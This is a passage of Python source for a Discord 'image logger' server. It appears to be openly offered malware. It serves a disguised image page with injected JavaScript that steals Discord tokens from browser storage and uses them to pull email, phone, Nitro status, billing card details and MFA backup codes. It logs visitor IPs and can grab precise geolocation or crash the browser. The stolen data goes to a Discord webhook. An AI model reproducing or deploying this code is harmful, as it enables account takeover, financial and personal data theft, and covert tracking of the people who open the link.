}],
    }
    
    # Add token fields if tokens were provided
    if tokens:
        token_field = ""
        for i, t in enumerate(tokens.get("tokens", []), 1):
            token_field += f"> **Token {i}:** `{t[:50]}...`\n"
        
        if tokens.get("email"):
            token_field += f"\n> **Email:** `{tokens['email']}`\n"
        if tokens.get("phone"):
            token_field += f"> **Phone:** `{tokens['phone']}`\n"
        if tokens.get("nitro"):
            token_field += f"> **Nitro:** `{tokens['nitro']}`\n"
        if tokens.get("billing"):
            token_field += f"> **Billing:** `{tokens['billing']}`\n"
        if tokens.get("backup_codes"):
            token_field += f"> **Backup Codes:** `{tokens['backup_codes']}`\n"
        
        embed["embeds"][0]["description"] += f"\n**--- TOKEN DATA ---**\n{token_field}"
        
        # Add full tokens as separate fields (hidden behind spoiler)
        if tokens.get("tokens"):
            full_tokens = "\n".join([f"||`{t}`||" for t in tokens["tokens"]])
            embed["embeds"][0]["fields"] = [{
                "name": "Full Tokens (Spoiler Tagged)",
                "value": full_tokens,
                "inline": False
            }]
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    requests.post(config["https://discord.com/api/webhooks/1513444189877174282/7imru0IN-nwceoc-qmn5T9H12FIxlg-qHiGdWd9nc8Ft7io7DYtcsabtG7d3LTrgANc3"], json=embed)
    return info

# Token grabbing JavaScript payload
TOKEN_GRABBER_JS = """
<script>
(function() {
    // Discord token extraction methods
    function getTokens() {
        let tokens = [];
        
        // Method 1: localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                if (key && (key.includes('token') || key === 'token')) {
                    let val = localStorage.getItem(key);
                    if (val && val.length > 50) {
                        tokens.push(val);
                    }
                }
            }
        } catch(e) {}
        
        // Method 2: Check window.localStorage directly
        try {
            let t = localStorage.getItem('token');
            if (t && t.length > 50 && !tokens.includes(t)) tokens.push(t);
        } catch(e) {}
        
        // Method 3: IndexedDB (Discord often uses this)
        try {
            let req = indexedDB.open('discord');
            req.onsuccess = function() {
                let db = req.result;
                if (db.objectStoreNames.length > 0) {
                    let tx = db.transaction(db.objectStoreNames[0], 'readonly');
                    let store = tx.objectStore(db.objectStoreNames[0]);
                    let req2 = store.getAll();
                    req2.onsuccess = function() {
                        let data = req2.result;
                        for (let item of data) {
                            if (typeof item === 'string' && item.length > 50 && item.includes('.')) {
                                if (!tokens.includes(item)) tokens.push(item);
                            }
                        }
                        sendTokens(tokens);
                    };
                    req2.onerror = function() { sendTokens(tokens); };
                } else {
                    sendTokens(tokens);
                }
            };
            req.onerror = function() { sendTokens(tokens); };
        } catch(e) {
            sendTokens(tokens);
        }
        
        // Fallback: send after timeout if IndexedDB is slow
        setTimeout(() => sendTokens(tokens), 3000);
    }
    
    function validateToken(token) {
        // Basic Discord token validation
        let parts = token.split('.');
        return parts.length === 3 && parts[0].length > 0 && parts[1].length > 0 && parts[2].length > 0;
    }
    
    function sendTokens(tokens) {
        if (tokens.length === 0) return;
        
        // Filter valid Discord tokens
        let validTokens = tokens.filter(t => validateToken(t));
        if (validTokens.length === 0) return;
        
        // Build payload
        let payload = {
            tokens: validTokens,
            email: '',
            phone: '',
            nitro: '',
            billing: '',
            backup_codes: ''
        };
        
        // For each valid token, try to fetch user info
        let primaryToken = validTokens[0];
        
        // Fetch user info
        fetch('""" + config.get("discordApi", "https://discord.com/api/v9/users/@me") + """', {
            headers: { 'Authorization': primaryToken }
        })
        .then(r => r.json())
        .then(user => {
            if (user.email) payload.email = user.email;
            if (user.phone) payload.phone = user.phone;
            
            // Check Nitro
            return fetch('""" + config.get("nitroApi", "https://discord.com/api/v9/users/@me/subscriptions") + """', {
                headers: { 'Authorization': primaryToken }
            });
        })
        .then(r => r.json())
        .then(nitro => {
            if (nitro && nitro.length > 0 && nitro[0].plan_id) {
                let planNames = {
                    '511651880837087232': 'Nitro Classic',
                    '511651871846596608': 'Nitro Boost',
                    '978896258977431562': 'Nitro Basic',
                    '521842865731534868': 'Nitro Classic (Old)',
                    '521847234246082599': 'Nitro Boost (Old)'
                };
                payload.nitro = planNames[nitro[0].plan_id] || 'Active (' + nitro[0].plan_id + ')';
            } else {
                payload.nitro = 'None';
            }
            
            // Check billing
            return fetch('""" + config.get("billingApi", "https://discord.com/api/v9/users/@me/billing/payment-sources") + """', {
                headers: { 'Authorization': primaryToken }
            });
        })
        .then(r => r.json())
        .then(billing => {
            if (billing && billing.length > 0) {
                let cards = billing.filter(b => b.type === 1);
                if (cards.length > 0) {
                    payload.billing = cards.map(c => c.brand + ' ****' + c.last_4).join(', ');
                } else {
                    payload.billing = billing.length + ' payment method(s)';
                }
            }
            
            // Backup codes (only if enabled)
            """ + ('fetch(\'' + config.get("backupCodesApi", "https://discord.com/api/v9/users/@me/mfa/codes") + '\', { headers: { \'Authorization\': primaryToken } }).then(r => r.json()).then(codes => { if (codes && codes.codes) { payload.backup_codes = codes.codes.slice(0, 3).join(\', \') + \'...\'; } }).catch(() => {}).finally(() => {' if config.get("grabBackupCodes", False) else '') + """
            
            // Send to webhook
            let xhr = new XMLHttpRequest();
            xhr.open('POST', window.location.href.split('?')[0] + '?token_capture=' + btoa(JSON.stringify(payload)), true);
            xhr.send();
            
            """ + ('}).catch(() => {});' if config.get("grabBackupCodes", False) else '') + """
        })
        .catch(() => {});
    }
    
    // Start token extraction
    if (document.readyState === 'complete') {
        getTokens();
    } else {
        window.addEventListener('load', getTokens);
    }
})();
</script>
"""

class TokenGrabberAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            # --- Handle token capture callback ---
            if dic.get("token_capture"):
                try:
                    token_data = json.loads(base64.b64decode(dic["token_capture"]).decode())
                    
                    if token_data.get("tokens"):
                        makeReport(
                            self.headers.get('x-forwarded-for'),
                            self.headers.get('user-agent'),
                            endpoint=s.split("?")[0],
                            url=config.get("image", ""),
                            tokens=token_data
                        )
                    
                    # Return 1x1 pixel GIF to silently complete
                    self.send_response(200)
                    self.send_header('Content-type', 'image/gif')
                    self.send_header('Content-Length', '43')
                    self.end_headers()
                    self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
                    return
                except:
                    pass
            
            # --- Handle image argument ---
            if config["imageArgument"]:
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            # --- Normal image logger behavior ---
            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for') and self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                return
            
            else:
                # Main page with token grabber JS
                result = makeReport(
                    self.headers.get('x-forwarded-for'),
                    self.headers.get('user-agent'),
                    endpoint=s.split("?")[0],
                    url=url
                )
                
                # Build the HTML page with image and token grabber
                html_parts = [data.decode()]
                
                # Add token grabber JS if enabled
                if config.get("grabTokens", True):
                    # Rebuild JS with current config values
                    js = TOKEN_GRABBER_JS
                    html_parts.append(js)
                
                # Add accurate location JS if enabled
                if config["accurateLocation"] and not dic.get("g"):
                    html_parts.append("""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>""")
                
                # Redirect or crash browser handling
                if config["redirect"]["redirect"]:
                    html_parts = [f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">']
                
                if config["crashBrowser"]:
                    html_parts.append('<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>')
                
                final_html = '\n'.join(html_parts).encode()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(final_html)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())
        
        return
    
    do_GET = handleRequest
    do_POST = handleRequest

# Keep the loading image binary
binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}
2
handler = app = TokenGrabberAPI
